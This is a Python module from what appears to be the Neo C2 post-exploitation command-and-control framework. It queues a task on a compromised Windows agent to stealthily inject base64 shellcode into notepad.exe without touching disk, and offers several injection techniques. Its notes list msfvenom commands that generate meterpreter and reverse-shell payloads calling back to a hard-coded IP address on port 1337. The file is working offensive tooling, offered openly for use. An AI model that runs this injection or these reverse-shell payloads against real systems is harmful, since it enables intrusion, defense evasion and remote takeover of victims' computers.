"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pinject",
        "description": "Stealthily inject shellcode into a target process (notepad.exe) on Windows systems without touching disk",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/NeoC2",
            "https://www.rapid7.com/docs/msfvenom/"
        ],
        "technique_id": "T1055",  # Process Injection
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run process injection on",
                "required": True
            },
            "shellcode": {
                "description": "The shellcode to inject as msfvenom base64 output",
                "required": True
            },
            "technique": {
                "description": "Injection technique to use: apc, ntcreatethread, rtlcreateuser, createremote, auto (default: auto)",
                "required": False,
                "default": "auto"
            }
        },
        "notes": {
            "msfvenom_examples": [
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0",
                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64 -w 0",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0"
            ]
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    shellcode_input = options.get("shellcode")
    technique = options.get("technique", "auto").lower()

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not shellcode_input:
        return {
            "success": False,
            "error": "shellcode is required"
        }

    # Validate technique parameter
    valid_techniques = ["auto", "apc", "ntcreatethread", "rtlcreateuser", "createremote"]
    if technique not in valid_techniques:
        return {
            "success": False,
            "error": f"Invalid technique: {technique}. Valid options: {', '.join(valid_techniques)}"
        }

    session.current_agent = agent_id

    # Check if shellcode_input is already base64 encoded content (indicates client-side file)
    if "FILE_NOT_FOUND_ON_CLIENT" in shellcode_input:
        # Special flag indicating the file was not found on the client side
        return {
            "success": False,
            "error": f"Shellcode file not found on client: {shellcode_input.replace(' FILE_NOT_FOUND_ON_CLIENT', '')}. No server-side fallback mechanism - file must exist on client."
        }
    elif _is_base64(shellcode_input):
        # The shellcode_input is already base64 encoded content from the client
        encoded_shellcode = shellcode_input
    else:
        # The CLI should have already handled file lookup and sent base64 content
        # If we get here, it means the CLI didn't properly handle the file lookup
        return {
            "success": False,
            "error": f"Invalid input format. CLI should send base64 encoded shellcode content, but received: {shellcode_input[:50]}..."
        }

    # Construct command with technique if not auto
    if technique == "auto":
        command = f"pinject {encoded_shellcode}"
    else:
        command = f"pinject {technique} {encoded_shellcode}"

    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] Process injection prepared for interactive mode",
            "command": command,
            "target_process": "notepad.exe"
        }
    elif not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    else:
        # Queue the task on the agent
        try:
            agent_manager = session.agent_manager
            task_id = agent_manager.add_task(agent_id, command)
            if task_id:
                return {
                    "success": True,
                    "output": f"[x] Process injection task {task_id} queued for agent {agent_id}",
                    "task_id": task_id,
                    "target_process": "notepad.exe"
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False


def process_shellcode_input(shellcode_input):
    if isinstance(shellcode_input, bytes):
        return shellcode_input

    if not isinstance(shellcode_input, str):
        raise ValueError("Shellcode must be a string or bytes")

    # Check if it's base64 encoded (common from msfvenom)
    if is_base64(shellcode_input):
        try:
            return base64.b64decode(shellcode_input)
        except Exception:
            pass  # Not valid base64, continue to other formats

    clean_hex = shellcode_input.replace('0x', '').replace(',', '').replace('\\', '').replace(' ', '').replace('\n', '').replace('\t', '')

    if re.match(r'^[0-9a-fA-F]+$', clean_hex) and len(clean_hex) % 2 == 0:
        try:
            return bytes.fromhex(clean_hex)
        except ValueError:
            raise ValueError("Invalid hex string for shellcode")

    # The CLI should have already handled file lookup and sent proper content
    # If we get here, the format is invalid
    raise ValueError(f"Invalid shellcode input format. Expected base64 encoded content from CLI, but received: {shellcode_input[:50]}...")


def is_base64(s):
    try:
        if len(s) % 4 != 0:
            return False

        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        decoded = base64.b64decode(s)
        encoded = base64.b64encode(decoded).decode('utf-8')
        return encoded == s.strip('=')
    except Exception:
        return False
